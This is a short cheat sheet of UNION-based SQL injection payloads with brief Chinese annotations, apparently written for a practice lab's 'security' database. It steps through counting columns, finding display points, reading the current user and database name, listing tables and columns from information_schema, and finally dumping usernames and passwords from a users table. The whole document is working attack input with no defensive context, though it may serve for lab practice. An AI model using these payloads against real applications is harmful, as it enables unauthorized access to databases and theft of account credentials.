order by 4 -- -
<br />判断有多少列
<br />union select 1,2,3 -- -
<br />判断数据显示点
<br />union select 1,user(),database()­­ -- -
<br />­显示出登录用户和数据库名
<br />union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security' ),3 -- -
<br />查看数据库有哪些表
<br />union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users' ),3 -- -
<br />查看对应表有哪些列
<br />union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -
<br />查看账号密码信息

